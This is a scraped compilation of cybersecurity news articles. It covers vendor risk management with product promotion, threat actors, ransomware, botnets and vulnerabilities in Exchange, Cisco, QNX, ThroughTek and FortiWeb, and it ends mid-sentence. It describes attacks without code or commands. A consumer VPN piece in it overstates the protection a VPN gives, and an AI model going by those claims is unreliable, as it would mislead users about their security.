who had data stolen. \nWhat is Vendor Risk Management (VRM)?\nTo meet the cybersecurity challenges in working with third-party vendors, organizations must focus on vendor risk management (VRM). What is VRM? Vendor risk management (VRM) allows organizations to focus on discovering and mitigating risks associated with third-party vendors. \nWith VRM, businesses have visibility into the vendors they have established relationships with and the security controls they have implemented to ensure their systems and processes are safe and secure. \nWith the significant risks and compliance regulations that have evolved for businesses today, VRM is a discipline that must be given due attention and have the buy-in from IT professionals and board members alike.\nNavigating Vendor Risk Management as IT Professionals\nPrimarily, the responsibility to discover, understand, and mitigate vendor risk management related to overall cybersecurity falls on the IT department and SecOps. In addition, IT is often responsible for forming the VRM strategy for the business and ensuring the organization’s overall cybersecurity is not sacrificed working with third-party solutions.\nTo implement a VRM successfully, organizations need to have a framework for managing vendor risk. Here are the seven steps we recommend taking to make sure your organization is safe from vendor risk: \nIdentify all vendors providing services for your organizationDefine the acceptable level of risk for your organizationIdentify the most critical risksClassify the vendors who provide services for your businessConduct regular vendor risk assessmentsHave valid contracts with vendors and proactively track the termsMonitor vendor risks over time\n1 — Identify all vendors providing services for your organization\nBefore you can effectively understand the risk to your business, you need to know all vendors used by your organization. A thorough inventory may include everything from lawn care to credit card services.\nHowever, having a thorough understanding and inventory of all vendors helps to ensure risk is calculated appropriately.\n2 — Define the acceptable level of risk for your organization\nDifferent types of businesses may have different expectations and risk areas that differ. For example, what is defined as important to a healthcare organization may vary from a financial institution. Whatever the case, determining the acceptable levels of risks helps ensure the appropriate mitigations are put in place, and the risk is acceptable to business stakeholders.\n \n3 — Identify the most critical risks\nThe risk posed by certain vendors is most likely going to be greater than others. For example, a lawn care company with no access to your technical infrastructure will probably be less risky than a third-party vendor with network-level access to certain business-critical systems. Therefore, ranking your risk levels related to specific vendors is vital to understanding your overall risk.\n4 — Classify the vendors who provide services for your business\nAfter vendors are identified who provide services for your business, these should be classified according to what services they offer and the risks they pose to your business.\n5 — Conduct regular vendor risk assessments\nEven if a business poses a slight risk at one point, this may change later. Like your business, the state of vendor infrastructure, services, software, and cybersecurity posture is constantly in flux. Therefore, perform regular vendor assessments to quickly identify a sudden change in the risk to your organization. \n6 — Have valid contracts with vendors and proactively track the terms\nEnsure you have valid contracts with all vendors. A contractual agreement legally establishes the expectations across all fronts, including security and risk assessment. Track the contracts and terms over time. It allows identifying any deviation from the contract terms as expressed.\n7 — Monitor vendor risks over time\nMonitor the risks posed by vendors over time. As discussed above, conducting regular vendor risk assessments and monitoring the risk over time helps to gain visibility into the risk that may continue to grow with a particular vendor. It may signal the need to look for another vendor.\nTrack credential security for third-party vendors\nAn area of concern working with a vendor or if you are a third-party vendor used by an organization is credentials. How do you ensure that credentials used by third-party vendors are secure? How do you prove you are on top of password security in your environment if a business requests proof of your credential security?\nSpecops Password Policy is a solution that allows businesses to bolster their password security and overall cybersecurity posture by:\nBreached password protectionImplementing strong password policiesAllowing the use of multiple password dictionariesClear and intuitive client messagingReal-time dynamic feedback to the clientLength-based password expirationBlocking of common password components such as usernames in passwordsEasily implement passphrasesRegular expressions\nSpecops Breached Password Protection now includes Live Attack Data as part of the Specops Breached Password Protection module. It allows Specops Password Policy with Breached Password Protection to protect your organization from breached passwords from both billions of breached passwords in the Specops database as well as from live attack data. \nProtect vendor passwords with Specops Breached Password Protection\nIf third-party vendor credentials in use in your environment become breached, you will be able to remediate the risk as soon as possible. Also, in conjunction with Specops Password Auditor, you can quickly and easily produce reports of the password standards you have in place in your organization. \nProduce audit reports using Specops Password Auditor\nWrapping it Up \nVendor Risk Management (VRM) is an essential part of the overall cybersecurity processes of organizations today. It allows managing the risks associated with third-party vendors and how these interact with your organization. Businesses must implement a framework to evaluate vendor risk and ensure these risks are tracked, documented, and monitored as needed.\nSpecops Password Policy and Specops Password Auditor allow businesses to bolster password security in their environment. It helps mitigate any risks associated with vendor passwords and easily monitors passwords to know if these become breached. In addition, Password Auditor can produce reports if you provide third-party services to organizations requesting you provide information regarding your password settings and policies. \n \n\n\nFound this article interesting?

However, tracking actors like this are crucial to preventing your enterprise from being hit with such an attack,“ the researchers said.\n“The information ShinyHunters gathers is often turned around and sold on the same underground marketplaces where ransomware actors use it to launch their own attacks. If enterprises can move to detect activity like ShinyHunters, they in turn can stop ransomware attacks before they are ever launched.“\n\n\nFound this article interesting?

While the former two were addressed by Microsoft on April 13, a patch for CVE-2021-31207 was shipped as part of the Windows maker’s May Patch Tuesday updates.\n\n“An attacker exploiting these vulnerabilities could execute arbitrary code on a vulnerable machine,“ CISA said.\nThe development comes a little over a week after cybersecurity researchers sounded the alarm on opportunistic scanning and exploitation of unpatched Exchange servers by taking advantage of the ProxyShell attack chain.\nImage Source: Huntress Labs\nOriginally demonstrated at the Pwn2Own hacking contest in April this year, ProxyShell is part of a broader trio of exploit chains discovered by DEVCORE security researcher Orange Tsai that includes ProxyLogon and ProxyOracle, the latter of which concerns two remote code execution flaws that could be employed to recover a user’s password in plaintext format.\n“They’re backdooring boxes with webshells that drop other webshells and also executables that periodically call out,“ researcher Kevin Beaumont noted last week.\n\nNow according to researchers from Huntress Labs, at least five distinct styles of web shells have been observed as deployed to vulnerable Microsoft Exchange servers, with over over 100 incidents reported related to the exploit between August 17 and 18. Web shells grant the attackers remote access to the compromised servers, but it isn’t clear exactly what the goals are or the extent to which all the flaws were used.\nMore than 140 web shells have been detected across no fewer than 1,900 unpatched Exchanger servers to date, Huntress Labs CEO Kyle Hanslovan tweeted, adding “impacted [organizations] thus far include building manufacturing, seafood processors, industrial machinery, auto repair shops, a small residential airport and more.“\n\n\nFound this article interesting?

What’s more, the 17.2 million rps alone accounted for 68% of the average rps rate of legitimate HTTP traffic processed by Cloudflare in Q2 2021, which is at 25 million HTTP rps.\n \nThis is far from the first time similar attacks have been detected in recent weeks. Cloudflare noted that the same Mirai botnet was used to strike a hosting provider with an HTTP DDoS attack that peaked a little below 8 million rps.\nSeparately, a Mirai-variant botnet was observed launching over a dozen UDP and TCP-based DDoS attacks that peaked multiple times above 1 Tbps. The company said the unsuccessful attacks were aimed at a gaming company and a major Asia Pacific-based internet services, telecommunications, and hosting provider.\n“While the majority of attacks are small and short, we continue to see these types of volumetric attacks emerging more often,“ Cloudflare said. “It’s important to note that these volumetric short burst attacks can be especially dangerous for legacy DDoS protection systems or organizations without active, always-on cloud-based protection.“\n\n\nFound this article interesting?

{'title': 'ShadowPad Malware is Becoming a Favorite Choice of Chinese Espionage Groups',
'text': 'ShadowPad, an infamous Windows backdoor that allows attackers to download further malicious modules or steal data, has been put to use by five different Chinese threat clusters since 2017.\n“The adoption of ShadowPad significantly reduces the costs of development and maintenance for threat actors,“ SentinelOne researchers Yi-Jhen Hsieh and Joey Chen said in a detailed overview of the malware, adding “some threat groups stopped developing their own backdoors after they gained access to ShadowPad.“\nThe American cybersecurity firm dubbed ShadowPad a “masterpiece of privately sold malware in Chinese espionage.“\n\nA successor to PlugX and a modular malware platform since 2015, ShadowPad catapulted to widespread attention in the wake of supply chain incidents targeting NetSarang, CCleaner, and ASUS, leading the operators to shift tactics and update their defensive measures with advanced anti-detection and persistence techniques.\n\nMore recently, attacks involving ShadowPad have singled out organizations in Hong Kong as well as critical infrastructure in India, Pakistan, and other Central Asian countries. Although primarily attributed to APT41, the implant is known to be shared among several Chinese espionage actors such as Tick, RedEcho, RedFoxtrot, and clusters dubbed Operation Redbonus, Redkanku, and Fishmonger.\n“[The threat actor behind Fishmonger is] now using it and another backdoor called Spyder as their primary backdoors for long-term monitoring, while they distribute other first-stage backdoors for initial infections including FunnySwitch, BIOPASS RAT, and Cobalt Strike,“ the researchers said. “The victims include universities, governments, media sector companies, technology companies and health organizations conducting COVID-19 research in Hong Kong, Taiwan, India and the U.S.“\n\nThe malware functions by decrypting and loading a Root plugin in memory, which takes care of loading other embedded modules during runtime, in addition to dynamically deploying supplementary plugins from a remote command-and-control (C2) server, enabling adversaries to incorporate extra functionality not built into the malware by default. At least 22 unique plugins have been identified to date.\nThe infected machines, for their part, are commandeered by a Delphi-based controller that’s used for backdoor communications, updating the C2 infrastructure, and managing the plugins.\nInterestingly, the feature set made available to ShadowPad users is not only tightly controlled by its seller, each plugin is sold separately instead of offering a full bundle containing all of the modules, with most samples — out of about 100 — embedded with less than nine plugins.\n“The emergence of ShadowPad, a privately sold, well-developed and functional backdoor, offers threat actors a good opportunity to move away from self-developed backdoors,“ the researchers said. “While it is well-designed and highly likely to be produced by an experienced malware developer, both its functionalities and its anti-forensics capabilities are under active development.“\n\n\nFound this article interesting?

{'title': 'Cybercrime Group Asking Insiders for Help in Planting Ransomware',
'text': 'A Nigerian threat actor has been observed attempting to recruit employees by offering them to pay $1 million in bitcoins to deploy Black Kingdom ransomware on companies’ networks as part of an insider threat scheme.\n“The sender tells the employee that if they’re able to deploy ransomware on a company computer or Windows server, then they would be paid $1 million in bitcoin, or 40% of the presumed $2.5 million ransom,“ Abnormal Security said in a report published Thursday. “The employee is told they can launch the ransomware physically or remotely. The sender provided two methods to contact them if the employee is interested—an Outlook email account and a Telegram username.“\n\nBlack Kingdom, also known as DemonWare and DEMON, attracted attention earlier this March when threat actors were found exploiting ProxyLogon flaws impacting Microsoft Exchange Servers to infect unpatched systems with the ransomware strain.\nAbnormal Security, which detected and blocked the phishing emails on August 12, responded to the solicitation attempt by creating a fictitious persona and reached out to the actor on Telegram messenger, only to have the individual inadvertently spill the attack’s modus operandi, which included two links for an executable ransomware payload that the “employee“ could download from WeTransfer or Mega.nz.\n“The actor also instructed us to dispose of the .EXE file and delete it from the recycle bin. Based on the actor’s responses, it seems clear that he 1) expects an employee to have physical access to a server, and 2) he’s not very familiar with digital forensics or incident response investigations,“ said Crane Hassold, director of threat intelligence at Abnormal Security.\n\nBesides taking a flexible approach to their ransom demands, the plan is believed to have been concocted by the chief executive of a Lagos-based social networking startup, with the goal of using the siphoned funds to “build my own company.“ In one of the conversations that took place over the course of five days, the individual even took to calling himself “the next Mark Zuckerberg.“\nAlso of particular note is the method of using LinkedIn to collect corporate email addresses of senior-level executives, once again highlighting how business email compromise (BEC) attacks originating from Nigeria continue to evolve and expose businesses to sophisticated attacks like ransomware.\n\n“There’s always been a blurry line between cyberattacks and social engineering, and this is an example of how the two are intertwined. As people become better at recognizing and avoiding phishing, it should be no surprise to see attackers adopt new tactics to accomplish their goals,“ Tim Erlin, vice president of product management and strategy at Tripwire, said.\n“The idea of a disgruntled insider as a cybersecurity threat isn’t new. As long as organizations require employees, there will always be some insider risk. The promise of getting a share of the ransom might seem attractive, but there’s almost zero guarantee that this kind of complicity will actually be rewarded, and it’s highly likely that someone taking this attacker up on their offer would get caught,“ Erlin added.\n\n\nFound this article interesting?

{'title': 'Mozi IoT Botnet Now Also Targets Netgear, Huawei, and ZTE Network Gateways',
'text': 'Mozi, a peer-to-peer (P2P) botnet known to target IoT devices, has gained new capabilities that allow it to achieve persistence on network gateways manufactured by Netgear, Huawei, and ZTE, according to latest findings.\n“Network gateways are a particularly juicy target for adversaries because they are ideal as initial access points to corporate networks,“ researchers at Microsoft Security Threat Intelligence Center and Section 52 at Azure Defender for IoT said in a technical write-up. “By infecting routers, they can perform man-in-the-middle (MITM) attacks—via HTTP hijacking and DNS spoofing—to compromise endpoints and deploy ransomware or cause safety incidents in OT facilities.“\n\nFirst documented by Netlab 360 in December 2019, Mozi has a history of infecting routers and digital video recorders in order to assemble them into an IoT botnet, which could be abused for launching distributed denial-of-service (DDoS) attacks, data exfiltration, and payload execution. The botnet is evolved from the source code of several known malware families such as Gafgyt, Mirai, and IoT Reaper.\nMozi spreads via the use of weak and default remote access passwords as well as through unpatched vulnerabilities, with the IoT malware communicating using a BitTorrent-like Distributed Hash Table (DHT) to record the contact information for other nodes in the botnet, the same mechanism used by file-sharing P2P clients. The compromised devices listen for commands from controller nodes and also attempt to infect other vulnerable targets.\n\nAn IBM X-Force analysis published in September 2020 noted that Mozi accounted for nearly 90% of the observed IoT network traffic from October 2019 through June 2020, indicating that threat actors are increasingly taking advantage of the expanding attack surface offered by IoT devices. In a separate investigation released last month, Elastic Security Intelligence and Analytics Team found that at least 24 countries have been targeted to date, with Bulgaria and India leading the pack.\n\nNow fresh research from Microsoft’s IoT security team has discovered that the malware “takes specific actions to increase its chances of survival upon reboot or any other attempt by other malware or responders to interfere with its operation,“ including achieving persistence on targeted devices and blocking TCP ports (23, 2323, 7547, 35000, 50023, and 58000) that are used to gain remote access to the gateway.\nWhat’s more, Mozi has been upgraded to support new commands that enable the malware to hijack HTTP sessions and carry out DNS spoofing so as to redirect traffic to an attacker-controlled domain.\nBusinesses and users using Netgear, Huawei, and ZTE routers are recommended to secure the devices using strong passwords and update the devices to the latest firmware. “Doing so will reduce the attack surfaces leveraged by the botnet and prevent attackers from getting into a position where they can use the newly discovered persistence and other exploit techniques,“ Microsoft said.\n\n\nFound this article interesting?

{'title': 'Critical Flaw Found in Older Cisco Small Business Routers Won’t Be Fixed',
'text': 'A critical vulnerability in Cisco Small Business Routers will not be patched by the networking equipment giant, since the devices reached end-of-life in 2019.\nTracked as CVE-2021-34730 (CVSS score: 9.8), the issue resides in the routers’ Universal Plug-and-Play (UPnP) service, enabling an unauthenticated, remote attacker to execute arbitrary code or cause an affected device to restart unexpectedly, resulting in a denial of service (DoS) condition.\nThe vulnerability, which the company said is due to improper validation of incoming UPnP traffic, could be abused to send a specially-crafted UPnP request to an affected device, resulting in remote code execution as the root user on the underlying operating system.\n\n“Cisco has not released and will not release software updates to address the vulnerability,“ the company noted in an advisory published Wednesday. “The Cisco Small Business RV110W, RV130, RV130W, and RV215W Routers have entered the end-of-life process. Customers are encouraged to migrate to the Cisco Small Business RV132W, RV160, or RV160W Routers.“\nThe issue impacts the following products —\nRV110W Wireless-N VPN FirewallsRV130 VPN RoutersRV130W Wireless-N Multifunction VPN RoutersRV215W Wireless-N VPN Routers\nIn the absence of a patch, Cisco recommends customers to disable UPnP on the LAN interface. Quentin Kaiser of IoT Inspector Research Lab has been credited with reporting the vulnerability.\n“All too often, after a system or service is replaced, the legacy system or service is left running ’just in case’ it is needed again. The problem lies in the fact that — like in the case of this vulnerability in the Universal Plug-and-Play service — the legacy system or service is usually not kept up to date with security updates or configurations,“ said Dean Ferrando, systems engineer manager (EMEA) at Tripwire.\n\n“This makes it an excellent target for bad actors, which is why organizations that are still using these old VPN routers should immediately take actions to update their devices. This should be part of an overall effort to harden systems across the entire attack surface, which helps to safeguard the integrity of digital assets and protect against vulnerabilities and common security threats which may be leveraged as entry points,“ Ferrando added.\nCVE-2021-34730 marks the second time the company has followed the approach of not releasing fixes for end-of-life routers since the start of the year. Earlier this April, Cisco urged users to upgrade their routers as a countermeasure to resolve a similar remote code execution bug (CVE-2021-1459) affecting RV110W VPN firewall and Small Business RV130, RV130W, and RV215W routers.\nIn addition, Cisco has also issued an alert for a critical BadAlloc flaw impacting BlackBerry QNX Real-Time Operating System (RTOS) that came to light earlier this week, stating that the company is “investigating its product line to determine which products and services may be affected by this vulnerability.“\n\n\nFound this article interesting?

{'title': 'Researchers Find New Evidence Linking Diavol Ransomware to TrickBot Gang',
'text': 'Cybersecurity researchers have disclosed details about an early development version of a nascent ransomware strain called Diavol that has been linked to threat actors behind the infamous TrickBot syndicate.\nThe latest findings from IBM X-Force show that the ransomware sample shares similarities to other malware that has been attributed to the cybercrime gang, thus establishing a clearer connection between the two.\nIn early July, Fortinet revealed specifics of an unsuccessful ransomware attack involving Diavol payload targeting one of its customers, highlighting the malware’s source code overlaps with that of Conti and its technique of reusing some language from Egregor ransomware in its ransom note.\n\n“As part of a rather unique encryption procedure, Diavol operates using user-mode Asynchronous Procedure Calls (APCs) without a symmetric encryption algorithm,“ Fortinet researchers previously said. “Usually, ransomware authors aim to complete the encryption operation in the shortest amount of time. Asymmetric encryption algorithms are not the obvious choice as they [are] significantly slower than symmetric algorithms.“\nNow an assessment of an earlier sample of Diavol — compiled on March 5, 2020, and submitted to VirusTotal on January 27, 2021 — has revealed insights into the malware’s development process, with the source code capable of terminating arbitrary processes and prioritizing file types to encrypt based on a pre-configured list of extensions defined by the attacker.\nWhat’s more, the initial execution of the ransomware leads to it collecting system information, which is used to generate a unique identifier that’s nearly identical to the Bot ID generated by TrickBot malware, except for the addition of the Windows username field. \nA point of similarity between the two ransomware samples concerns the registration process, where the victim machine uses the identifier created in the previous step to register itself with a remote server. “This registration to the botnet is nearly identical in both samples analyzed,“ IBM Security’s Charlotte Hammond and Chris Caridi said. “The primary difference is the registration URL changing from https://[server_address]/bots/register to https://[server_address]/BnpOnspQwtjCA/register.“\n\nBut unlike the fully functional variant, the development sample not only has its file enumeration and encryption functions left unfinished, it also directly encrypts files with the extension “.lock64“ as they are encountered, instead of relying on asynchronous procedure calls. A second deviation detected by IBM is that the original file is not deleted post encryption, thus obviating the need for a decryption key.\nDiavol’s links to TrickBot also boil down to the fact that HTTP headers used for command-and-control (C2) communication are set to prefer Russian language content, which matches the language used by the operators.\nAnother clue tying the malware to the Russian threat actors is the code for checking the language on the infected system to filter out victims in Russia or the Commonwealth of Independent States (CIS) region, a known tactic adopted by the TrickBot group.\n“Collaboration between cybercrime groups, affiliate programs and code reuse are all parts of a growing ransomware economy,“ the researchers said. “The Diavol code is relatively new in the cybercrime area, and less infamous than Ryuk or Conti, but it likely shares ties to the same operators and blackhat coders behind the scenes.“\n\n\nFound this article interesting?

{'title': 'Critical ThroughTek SDK Bug Could Let Attackers Spy On Millions of IoT Devices',
'text': 'A security vulnerability has been found affecting several versions of ThroughTek Kalay P2P Software Development Kit (SDK), which could be abused by a remote attacker to take control of an affected device and potentially lead to remote code execution.\nTracked as CVE-2021-28372 (CVSS score: 9.6) and discovered by FireEye Mandiant in late 2020, the weakness concerns an improper access control flaw in ThroughTek point-to-point (P2P) products, successful exploitation of which could result in the “ability to listen to live audio, watch real time video data, and compromise device credentials for further attacks based on exposed device functionality.“\n\n“Successful exploitation of this vulnerability could permit remote code execution and unauthorized access to sensitive information, such as to camera audio/video feeds,“ the U.S. Cybersecurity and Infrastructure Security Agency (CISA) noted in an advisory.\nThere are believed to be 83 million active devices on the Kalay platform. The following versions of Kalay P2P SDK are impacted -\nVersions 3.1.5 and priorSDK versions with the nossl tagDevice firmware that does not use AuthKey for IOTC connectionDevice firmware using the AVAPI module without enabling DTLS mechanismDevice firmware using P2PTunnel or RDT module\nThe Taiwanese company’s Kalay platform is a P2P technology that allows IP cameras, light cameras, baby monitors, and other internet-enabled video surveillance products to handle secure transmission of large audio and video files at low latency. This is made possible through the SDK – an implementation of the Kalay protocol – that’s integrated into mobile and desktop apps and networked IoT devices.\n\nCVE-2021-28372 resides in the registration process between the devices and their mobile applications, specifically concerning how they access and join the Kalay network, enabling attackers to spoof a victim device’s identifier (called UID) to maliciously register a device on the network with the same UID, causing the registration servers to overwrite the existing device and route the connections to be mistakenly routed to the rogue device.\n\n“Once an attacker has maliciously registered a UID, any client connection attempts to access the victim UID will be directed to the attacker,“ the researchers said. “The attacker can then continue the connection process and obtain the authentication materials (a username and password) needed to access the device. With the compromised credentials, an attacker can use the Kalay network to remotely connect to the original device, access AV data, and execute RPC calls.“\n\nHowever, it’s worth pointing out that an adversary would require “comprehensive knowledge“ of the Kalay protocol, not to mention obtain the Kalay UIDs through social engineering or other vulnerabilities in APIs or services that could be taken advantage of to pull off the attacks.\nTo mitigate against any potential exploitation, it’s recommended to upgrade the Kalay protocol to version 3.1.10 as well as enable DTLS and AuthKey to secure data in transit and add an additional layer of authentication during client connection.\nThe development marks the second time a similar vulnerability has been disclosed in ThroughTek’s P2P SDK. In June 2021, CISA issued an alert warning of a critical flaw (CVE-2021-32934) that could be leveraged to access the camera audio and video feeds through improper means.\n\n\nFound this article interesting?

'text': 'A major vulnerability affecting older versions of BlackBerry’s QNX Real-Time Operating System (RTOS) could allow malicious actors to cripple and gain control of a variety of products, including cars, medical, and industrial equipment.\nThe shortcoming (CVE-2021-22156, CVSS score: 9.0) is part of a broader collection of flaws, collectively dubbed BadAlloc, that was originally disclosed by Microsoft in April 2021, which could open a backdoor into many of these devices, allowing attackers to commandeer them or disrupt their operations.\n“A remote attacker could exploit CVE-2021-22156 to cause a denial-of-service condition or execute arbitrary code on affected devices,“ the U.S. Cybersecurity and Infrastructure Security Agency (CISA) said in a Tuesday bulletin. As of writing, there is no evidence of active exploitation of the vulnerability.\n\nBlackBerry QNX technology is used worldwide by over 195 million vehicles and embedded systems across a wide range of industries, including aerospace and defense, automotive, commercial vehicles, heavy machinery, industrial controls, medical, rail, and robotics.\nBlackBerry, in an independent advisory, characterized the issue as “an integer overflow vulnerability in the calloc() function of the C runtime library“ affecting its QNX Software Development Platform (SDP) version 6.5.0SP1 and earlier, QNX OS for Medical 1.1 and earlier, and QNX OS for Safety 1.0.1. Manufacturers of IoT and OT devices that incorporate affected QNX-based systems are advised to apply the following patches -\nQNX SDP 6.5.0 SP1 - Apply patch ID 4844 or update to QNX SDP 6.6.0 or laterQNX OS for Safety 1.0 or 1.0.1 - Update to QNX OS for Safety 1.0.2, andQNX OS for Medical 1.0 or 1.1 - Apply patch ID 4846 to update to QNX OS for Medical 1.1.1\n“Ensure that only ports and protocols used by the application using the RTOS are accessible, blocking all others,“ BlackBerry suggested as mitigations. “Follow network segmentation, vulnerability scanning, and intrusion detection best practices appropriate for use of the QNX product in your cybersecurity environment to prevent malicious or unauthorized access to vulnerable devices.“\n\nIn a separate report, Politico revealed that BlackBerry resisted efforts to publicly announce the BadAlloc vulnerability in late April, citing people familiar with the matter, instead opting to privately contact its customers and warn them about the issue — an approach that could have put several device manufacturers at risk — only to backtrack after the company couldn’t identify all of the vendors using its software.\n“BlackBerry representatives told CISA earlier this year that they didn’t believe BadAlloc had impacted their products, even though CISA had concluded that it did,“ the report said, adding “over the last few months, CISA pushed BlackBerry to accept the bad news, eventually getting them to acknowledge the vulnerability existed.“\n\n\nFound this article interesting?

'text': 'IT and communication companies in Israel were at the center of a supply chain attack campaign spearheaded by an Iranian threat actor that involved impersonating the firms and their HR personnel to target victims with fake job offers in an attempt to penetrate their computers and gain access to the company’s clients.\nThe attacks, which occurred in two waves in May and July 2021, have been linked to a hacker group called Siamesekitten (aka Lyceum or Hexane) that has primarily singled out oil, gas, and telecom providers in the Middle East and in Africa at least since 2018, researchers from ClearSky said in a report published Tuesday.\n\nInfections undertaken by the adversary commenced with identifying potential victims, who were then enticed with “alluring“ job offers in well-known companies like ChipPc and Software AG by posing as human resources department employees from the impersonated firms, only to lead the victims to a phishing website containing weaponized files that unload a backdoor known as Milan to establish connections with a remote server and download a second-stage remote access trojan named DanBot.\n\nClearSky theorized that the attacks’ focus on IT and communication companies suggest they are intended to facilitate supply chain attacks on their clients. \n\nBesides employing lure documents as an initial attack vector, the group’s infrastructure included setting up fraudulent websites to mimic the company being impersonated as well as creating fake profiles on LinkedIn. The lure files, for their part, take the form of a macro-embedded Excel spreadsheet that details the supposed job offers and a portable executable (PE) file that includes a ’catalog’ of products used by the impersonated organization.\n\nRegardless of the file downloaded by the victim, the attack chain culminates in the installation of the C++-based Milan backdoor. The July 2021 attacks against Israeli companies are also notable for the fact that the threat actor replaced Milan with a new implant called Shark that’s written in .NET.\n“This campaign is similar to the North Korean ’job seekers’ campaign, employing what has become a widely used attack vector in recent years - impersonation,“ the Israeli cybersecurity company said. “The group’s main goal is to conduct espionage and utilize the infected network to gain access to their clients’ networks. As with other groups, it is possible that espionage and intelligence gathering are the first steps toward executing impersonation attacks targeting ransomware or wiper malware.“\n\n\nFound this article interesting?

Is your private information and files safer on the internet with a VPN? How much of a difference does it make in terms of data protection? \nThe answer to these questions isn’t as simple as Yes or No. So, keep reading to find out.\nDoes a VPN Prevent Hacking? \nYou should definitely use a VPN on a public network or your home wi-fi because it significantly protects your privacy. But a VPN can’t simply protect you from every single type of cyber attack. Some attacks are very sophisticated and complex, which even a VPN can’t prevent. \nBut let’s look at some of the cyber attacks that a VPN can stop.\n1 — MITM (Man-in-the-Middle) Attack \nA MITM attack is when a hacker comes in between you and the person or web server that you’re trying to communicate with over the internet. It’s like eavesdropping, as the hacker interrupts and steals data from an existing conversation or data transfer. \nWhen a hacker knows which network you’re on, they can exploit its weak encryption standards to intercept your data transfers. The scariest thing is that you won’t even notice it. Using this method, hackers can easily steal sensitive information like credit card details or login credentials. \nMost wi-fi networks, specifically public wi-fi networks, use the WPA2 security standard, which is a very weak encryption standard and vulnerable to MITM attacks. Even the WPA3 standard is not entirely foolproof.\nSo, how does a VPN help in this situation? \nA VPN encrypts all of your activity online. VPN encryptions are so strong that it’s nearly impossible to crack. When using a VPN, your IP will be bounced around different locations. The hacker won’t even know your real IP address that’s connected to the network. They’ll have no idea what sites you’re browsing, so they can’t intercept or redirect you to fake sites. \n2 — Remote Hacking\nOne of the oldest and most effective tricks used by hackers is gaining access to your system through your IP address. Almost every website you visit tracks your IP address. If one of those websites is compromised by an attacker, they’ll have access to your IP address. Then it’s just a case of using that IP address as a backdoor into your system. We’re talking about your smartphone, pc, TV, CCTV, everything that’s connected to your wi-fi. \nA VPN masks your real IP address, preventing hackers from gaining access to it. So, if you’re connected to a VPN when browsing the internet, every site you visit won’t actually be tracking your real IP, so there’s no way for hackers to know about it. \n3 — DDoS/DoS Attack \nDDoS (Distributed Denial of Service) attacks are when hackers flood your network with unwanted requests and traffic. The aim is to force you offline for some time or crash the website/service that you’re trying to access. \nDDoS attacks are super annoying, and almost any wannabe hackers these days can run time. Imagine trying to meet a deadline, but you keep getting kicked out of your network.\nWith a VPN, however, you don’t need to worry about DDoS attacks. For this attack to work, the hacker needs to know your IP address. without knowing your IP, where is he going to target the attack? \nBy hiding your real IP address, a VPN protects you from becoming a target of such attacks, and you can keep enjoying an uninterrupted connection. \nIt’s important to note that a VPN won’t protect you from someone who already knows your real IP address. In such cases, the best solution is to talk to your ISP. \nWhich Attacks a VPN Can’t Prevent? \nBasically, a VPN won’t protect you against attacks that don’t require access to your IP address. Such as malware attacks and phishing attacks. \nSome attackers can gain control of your device by injecting malicious software, files, and codes into your system. You might be exposed to malware when you visit unauthorized websites or try to download third-party apps. \nSometimes, hackers can send you a fake email containing malicious files, which can compromise your system once opened or downloaded. In such cases, a VPN won’t be able to help you. You should consider getting antivirus software on your device for better protection against malware attacks. \nSimilarly, a VPN won’t help you much against phishing attacks. The best it can do is block shady domains that are pretty obvious, like “paipa1.xyz“. However, it can’t protect you from phishing emails. Hackers create more than 1.4 million phishing sites every month and most of them are hard to distinguish from real sites. You can use anti-phishing browser extensions for better protection against phishing attacks. \nTo Sum It Up \nYes, a VPN will protect you from most cyberattacks that require access to your IP address. However, it might not be of much help against more sophisticated attacks such as malware. Regardless, a VPN can give you advanced protection in terms of securing your personal data and information online. So, having one does reduce your chances of easily getting hacked online. \nIn addition, a VPN can help you enjoy an uninterrupted connection and even an extra boost to your internet speed in some cases. \nLooking to try out a VPN for free before committing to a subscription?

'text': 'A North Korean threat actor has been discovered taking advantage of two exploits in Internet Explorer to infect victims with a custom implant as part of a strategic web compromise (SWC) targeting a South Korean online newspaper.\nCybersecurity firm Volexity attributed the watering hole attacks to a threat actor it tracks as InkySquid, and more widely known by the monikers ScarCruft and APT37. Daily NK, the publication in question, is said to have hosted the malicious code from at least late March 2021 until early June 2021.\nThe “clever disguise of exploit code amongst legitimate code“ and the use of custom malware enables the attackers to avoid detection, Volexity researchers said.\n\nThe attacks involved tampering with the jQuery JavaScript libraries hosted on the website to serve additional obfuscated JavaScript code from a remote URL, using it to leverage exploits for two Internet Explorer flaws that were patched by Microsoft in August 2020 and March 2021. Successful exploitation resulted in the deployment of a Cobalt Strike stager and novel backdoor called BLUELIGHT. \nCVE-2020-1380 (CVSS score: 7.5) - Scripting Engine Memory Corruption VulnerabilityCVE-2021-26411 (CVSS score: 8.8) - Internet Explorer Memory Corruption Vulnerability\nIt’s worth noting that both the flaws have been actively exploited in the wild, with the latter put to use by North Korean hackers to compromise security researchers working on vulnerability research and development in a campaign that came to light earlier this January.\n\nIn a separate set of attacks disclosed last month, an unidentified threat actor was found exploiting the same flaw to deliver a fully-featured VBA-based remote access trojan (RAT) on compromised Windows systems.\n\nBLUELIGHT is used as a secondary payload following the successful delivery of Cobalt Strike, functioning as a full-featured remote access tool that provides complete access to a compromised system.\nIn addition to gathering system metadata and information about installed antivirus products, the malware is capable of executing shellcode, harvesting cookies and passwords from Internet Explorer, Microsoft Edge, and Google Chrome browsers, collecting files and downloading arbitrary executables, the results of which are exfiltrated to a remote server.\n“While SWCs are not as popular as they once were, they continue to be a weapon in the arsenal of many attackers,“ the researchers noted. “The use of recently patched exploits for Internet Explorer and Microsoft Edge will only work against a limited audience.“\n\n\nFound this article interesting?

{'title': 'Unpatched Remote Hacking Flaw Disclosed in Fortinet’s FortiWeb WAF',
'text': 'Details have emerged about a new unpatched security vulnerability in Fortinet’s web application firewall (WAF) appliances that could be abused by a remote, authenticated attacker to execute malicious commands on the system.\n“An OS command injection vulnerability in FortiWeb’s management interface (version 6.3.11 and prior) can allow a remote, authenticated attacker to execute arbitrary commands on the system, via the SAML server configuration page,“ cybersecurity firm Rapid7 said in an advisory published Tuesday. “This vulnerability appears to be related to CVE-2021-22123, which was addressed in FG-IR-20-120.“\n\nRapid7 said it discovered and reported the issue in June 2021. Fortinet is expected to release a patch at the end of August with version Fortiweb 6.4.1.\nThe command injection flaw is yet to be assigned a CVE identifier, but it has a severity rating of 8.7 on the CVSS scoring system. Successful exploitation of the vulnerability can allow authenticated attackers to execute arbitrary commands as the root user on the underlying system via the SAML server configuration page.\n“An attacker can leverage this vulnerability to take complete control of the affected device, with the highest possible privileges,“ Rapid7’s Tod Beardsley said. “They might install a persistent shell, crypto mining software, or other malicious software. In the unlikely event the management interface is exposed to the internet, they could use the compromised platform to reach into the affected network beyond the 